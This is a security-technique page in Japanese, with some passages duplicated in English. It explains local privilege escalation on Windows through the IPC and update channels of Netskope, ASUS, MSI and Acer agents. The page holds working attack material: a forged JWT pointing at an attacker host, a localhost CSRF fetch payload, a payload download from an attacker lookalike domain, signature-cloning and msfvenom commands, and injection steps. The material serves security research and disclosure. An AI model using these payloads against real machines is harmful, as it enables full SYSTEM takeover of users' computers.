# エンタープライズ Auto-Updaters と Privileged IPC の悪用 (例: Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

このページは、低\-摩擦な IPC サーフェスと特権更新フローを公開するエンタープライズ向けエンドポイントエージェントやアップデータで見られる Windows ローカル特権昇格チェーンの一群を一般化したものです。代表的な例として Netskope Client for Windows < R129 (CVE-2025-0309) があり、ここでは低\-privileged なユーザが enrollment を攻撃者管理下のサーバに強制し、その後 SYSTEM サービスがインストールする悪意ある MSI を配布できます。

再利用可能な主要なアイデア:
- 特権サービスの localhost IPC を悪用して、攻撃者サーバへの再 enrollment や再設定を強制する。
- ベンダの update エンドポイントを実装し、rogue Trusted Root CA を配布して、updater を悪意のある「署名済み」パッケージに向ける。
- CN allow\-lists、オプションの digest flags、緩い MSI プロパティなどの弱い署名者チェックを回避する。
- IPC が「encrypted」であれば、registry に保存された world\-readable なマシン識別子から key/IV を導出する。
- サービスが image path/process name によって呼び出し元を制限する場合は、allow\-listed なプロセスにインジェクトするか、プロセスを suspended 状態で生成して最小限の thread\-context patch で DLL をブートストラップする。

---
## 1) localhost IPC を介して攻撃者サーバへの enrollment を強制する

多くのエージェントは、localhost TCP 上で JSON を使って SYSTEM サービスと通信する user\-mode UI プロセスを同梱しています。

Netskope で観測された例:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

エクスプロイトの流れ:
1) backend host（例: AddonUrl）を制御するクレームを持つ JWT enrollment token を作成する。署名が不要になるよう alg=None を使用する。
2) provisioning コマンドを呼び出す IPC メッセージにあなたの JWT と tenant name を含めて送信する:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスがあなたの悪意あるサーバーに enrollment/config を要求し始めます。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name\-based, originate the request from a allow\-listed vendor binary (see §4).

---
## 2) アップデートチャネルをハイジャックして SYSTEM としてコードを実行

クライアントがあなたのサーバーと通信したら、期待される endpoints を実装し、attacker MSI に誘導します。典型的なシーケンス:

1) /v2/config/org/clientconfig → 非常に短い updater interval を持つ JSON config を返す。例:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA 証明書を返す。サービスはそれを Local Machine Trusted Root store にインストールする。
3) /v2/checkupdate → 悪意のある MSI と偽のバージョンを指すメタデータを返す。

Bypassing common checks seen in the wild:
- Signer CN allow\-list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” と等しいかだけを確認する場合がある。あなたの不正な CA はその CN を持つリーフ証明書を発行し、MSI に署名できる。
- CERT_DIGEST property: CERT_DIGEST という名前の無害な MSI プロパティを含める。インストール時に強制されない。
- Optional digest enforcement: config フラグ（例: check_msi_digest=false）が追加の暗号検証を無効化する。

Result: SYSTEM サービスは C:\ProgramData\Netskope\stAgent\data\*.msi からあなたの MSI をインストールし、NT AUTHORITY\SYSTEM として任意のコードを実行する。

---
## 3) Forging encrypted IPC requests (when present)

R127 以降、Netskope は IPC の JSON を encryptData フィールドでラップし、Base64 に見える形式にしていた。リバースで判明したのは、AES がレジストリ値から派生した key/IV を使っており、これらは任意のユーザから読み取れるということ:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者は暗号化を再現して標準ユーザから有効な暗号化コマンドを送信できる。一般的なヒント：エージェントが突然 IPC を「暗号化」し始めたら、HKLM 以下にある device ID、product GUID、install ID 等を探せ。

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

一部のサービスは TCP 接続の PID を解決し、イメージのパス/名前を Program Files 以下にあるベンダーの allow\-listed バイナリ（例: stagentui.exe, bwansvc.exe, epdlp.exe）と比較してピアを認証しようとする。

実用的なバイパスは二つ:
- allow\-listed プロセス（例: nsdiag.exe）への DLL インジェクションを行い、その内部から IPC をプロキシする。
- allow\-listed バイナリを CREATE_SUSPENDED で起動し、CreateRemoteThread を使わずにプロキシ DLL をブートストラップして、ドライバによる改ざん防止ルールを満たす（§5 を参照）。

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

製品は多くの場合、minifilter/OB callbacks ドライバ（例: Stadrv）を同梱し、保護プロセスのハンドルから危険な権限を削る:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME を削除
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE に制限

これらの制約を尊重する信頼できるユーザモードローダ:
1) ベンダーバイナリを CREATE_SUSPENDED で CreateProcess する。
2) 取得可能なハンドルを得る: プロセスに対して PROCESS_VM_WRITE | PROCESS_VM_OPERATION、スレッドに対して THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または既知の RIP にコードをパッチするなら THREAD_RESUME のみ）。
3) ntdll!NtContinue（または他の早期かつ確実にマップされる thunk）を、あなたの DLL パスで LoadLibraryW を呼び、その後戻る小さなスタブに上書きする。
4) ResumeThread してプロセス内でスタブを実行させ、DLL をロードさせる。

既に保護されたプロセスに対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使っていない（あなたがプロセスを作成した）ため、ドライバのポリシーは満たされる。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) は rogue CA、悪意のある MSI による署名、そして必要なエンドポイント（/v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate）を自動化する。
- UpSkope は任意（オプションで AES\-encrypted）IPC メッセージを作成するカスタム IPC クライアントで、allow\-listed バイナリから発信するための suspended\-process 注入を含む。

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub は 127.0.0.1:53000 上でユーザモードの HTTP サービス（ADU.exe）を提供し、https://driverhub.asus.com から来るブラウザ呼び出しを期待している。origin フィルタは Origin ヘッダと `/asus/v1.0/*` で公開されたダウンロード URL に対して単純に `string_contains(".asus.com")` を行うだけだ。したがって `https://driverhub.asus.com.attacker.tld` のような攻撃者管理のホストはチェックを通過し、JavaScript から状態を変更するリクエストを発行できる。追加のバイパスパターンは [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照。

Practical flow:
1) `.asus.com` を埋め込んだドメインを登録し、そこに悪意のあるページをホストする。
2) `fetch` や XHR を使って `http://127.0.0.1:53000` 上の特権エンドポイント（例: `Reboot`, `UpdateApp`）を呼ぶ。
3) ハンドラが期待する JSON ボディを送る — パックされたフロントエンド JS は下に示すスキーマを表示している。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
下に示した PowerShell CLI でさえ、Origin ヘッダーを信頼された値に偽装すると成功します:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

攻撃に転用する手順:
1) ペイロードを作成する（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUS の署名者をそれにクローンする（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `pwn.exe` を `.asus.com` に似せたドメインでホストし、上記のブラウザCSRFで UpdateApp をトリガーする。

Origin と URL フィルタがどちらも部分文字列ベースであり、署名者チェックが文字列比較のみであるため、DriverHub は攻撃者のバイナリを高権限コンテキストで取得して実行します。

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker\-controlled arguments.

コピーされたファイルは検証と `ExecuteTask()` の間でロックされません。攻撃者は次のことが可能です:
- フレームAを送信して正当な MSI 署名付きバイナリを指示する（署名チェックが通り、タスクがキューされることを保証する）。
- それに対して悪意あるペイロードを指すフレームBを繰り返し送り競合を起こし、検証完了直後に `MSI Center SDK.exe` を上書きする。

スケジューラが実行されると、元のファイルが検証されていたにもかかわらず上書きされたペイロードが SYSTEM として実行されます。信頼できる悪用には、TOCTOU の窓を勝ち取るまで CMD_AutoUpdateSDK をスパムする2つの goroutines/threads を使います。

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

- `MSI.CentralServer.exe` によりロードされる各プラグイン/DLL は、`HKLM\SOFTWARE\MSI\MSI_CentralServer` に格納された Component ID を受け取ります。フレームの最初の4バイトがそのコンポーネントを選択し、攻撃者は任意のモジュールにコマンドをルーティングできます。
- プラグインは独自のタスクランナーを定義できます。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、`API_Support.EX_Task::ExecuteTask()` を直接呼び出します（**no signature validation**）— 任意のローカルユーザが `C:\Users\<user>\Desktop\payload.exe` を指して確定的に SYSTEM 実行を得られます。
- Wireshark でループバックをスニッフィングするか dnSpy で .NET バイナリをインストルメントすると、Component ↔ command のマッピングがすぐに明らかになります。カスタムの Go/Python クライアントでフレームをリプレイできます。

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

- `ACCSvc.exe` (SYSTEM) は `\\.\pipe\treadstone_service_LightMode` を公開し、その discretionary ACL はリモートクライアント（例: `\\TARGET\pipe\treadstone_service_LightMode`）を許可します。ファイルパスとともにコマンドID `7` を送ると、サービスのプロセス生成ルーチンが呼び出されます。
- クライアントライブラリは引数とともにマジックターミネータバイト (113) をシリアライズします。Frida/`TsDotNetLib` による動的インストルメンテーション（インストルメンテーションのヒントは [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）により、ネイティブハンドラがこの値を `SECURITY_IMPERSONATION_LEVEL` と整合性 SID にマッピングしてから `CreateProcessAsUser` を呼ぶことが示されます。
- 113 (`0x71`) を 114 (`0x72`) に差し替えると、フルの SYSTEM トークンを保持し高い整合性 SID (`S-1-16-12288`) を設定する汎用ブランチに入ります。したがって起動されたバイナリはローカルでもクロスマシンでも制限のない SYSTEM として実行されます。
- これを公開されているインストーラフラグ（`Setup.exe -nocheck`）と組み合わせれば、ラボVM上でも ACC を立ち上げてベンダーのハードウェアなしでパイプを試せます。

これらの IPC バグは、ローカルホストサービスが相互認証（ALPC SIDs、`ImpersonationLevel=Impersonation` フィルタ、トークンフィルタリング）を強制する必要性、そして各モジュールの「任意のバイナリを実行する」ヘルパーが同じ署名検証を共有しなければならない理由を示しています。

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
